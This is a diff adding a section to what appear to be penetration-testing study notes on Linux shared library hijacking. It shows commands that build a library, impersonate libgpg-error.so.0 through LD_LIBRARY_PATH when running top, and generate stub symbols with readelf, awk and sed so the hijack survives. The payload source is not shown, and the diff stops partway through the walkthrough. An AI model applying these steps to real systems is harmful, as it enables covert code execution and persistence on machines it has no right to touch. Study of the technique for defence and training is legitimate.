@@ -93,4 +93,60 @@ Compile shellcode wrapper, don't forget to compile the c code in the same archit
 ```
 kali@kali:~$ gcc -o CWrapper.out CWrapper.c -z execstack
 ```
-394
+
+## Shared Libraries attack in Linux
+
+Like dll in windows, shared libraries allow code to be defined separately from specific applications and reused. 
+When applications run on linux, they check for required libraries in a number of locations in specific order, once they find a copy of the library, they will stop searching and load the module. The directory search order is:
+- 1.application’s RPATH5 value
+- 2.LD_LIBRARY_PATH environment variable
+- 3.the application’s RUNPATH
+- 4./etc/ld.so.conf.
+- 5.System library directories: /lib, /lib64, /usr/lib, /usr/lib64, /usr/local/lib, /usr/local/lib64, and
+potentially others.
+
+Let's wal though an example with up command in linux.
+- 1.Let's create a c file [lib.c](/08PlayingWithLinux/lib.c), then compile it to lib resource
+- 2.We can compile the share libary with the follwoing command, -Wall->give verbose warnings when compiling, -fPIC ->use position independent code, since shared libraries are loaded in unpredictable memeory locations. -shared -> create a shared library from object file
+
+```
+offsec@linuxvictim:~/ldlib$ gcc -Wall -fPIC -c -o lib.o lib.c
+offsec@linuxvictim:~/ldlib$ gcc -shared -o lib.so lib.o
+```
+- 3. We use **ldd** command against top program to understand which libraries are being loaded when top executes.
+```
+offsec@linuxvictim:~$ ldd /usr/bin/top
+linux-vdso.so.1 (0x00007ffd135c5000)
+libprocps.so.6 => /lib/x86_64-linux-gnu/libprocps.so.6 (0x00007ff5ab935000)
+libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007ff5ab70b000)
+libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000)
+```
+Okay,libgpg-error.so.0 looks intersting, This is likely
+to be loaded by the application but not likely to be called unless the program encounters an error therefore this shouldn’t prevent normal use of the application. Let’s try to hijack.
+
+- 4. We rename .so file to match the one we’re hijacking and set the environment variable for LD_LIBRARY_PATH
+```
+offsec@linuxvictim:~/ldlib$ export LD_LIBRARY_PATH=/home/offsec/ldlib/
+offsec@linuxvictim:~/ldlib$ cp lib.so libgpg-error.so.
+```
+- 5. Execute the top program and we identify symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined.
+```
+offsec@linuxvictim:~/ldlib$ top
+top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required
+by /lib/x86_64-linux-gnu/libgcrypt.so.20)
+top: relocation error: /lib/x86_64-linux-gnu/libgcrypt.so.20: symbol gpgrt_lock_lock
+version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference
+```
+- 6. this means that certain variables or functions that the program expects to find when loading the original library have not been defined in our malicious library. we can simply define some variables with the same names that it expects and top should run. We will examine the libgpg-error.so.0  to detemine what symbols it contains using the **readelf** The error message tell use to look for **GPG_ERROR_1.0.**
+
+-s flag for symblos, --wide flag to force the untruncated names of the symbols, awk to pring 8th filed and append int in front of the resutlt, sed command to replace version
+information with a semicolon in order to finalize the variable definitions
+```
+offsec@linuxvictim:~/ldlib$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
+int gpgrt_onclose;
+int _gpgrt_putc_overflow;
+int gpgrt_feof_unlocked;
+...
+int gpgrt_fflush;
+int gpgrt_poll;
+```
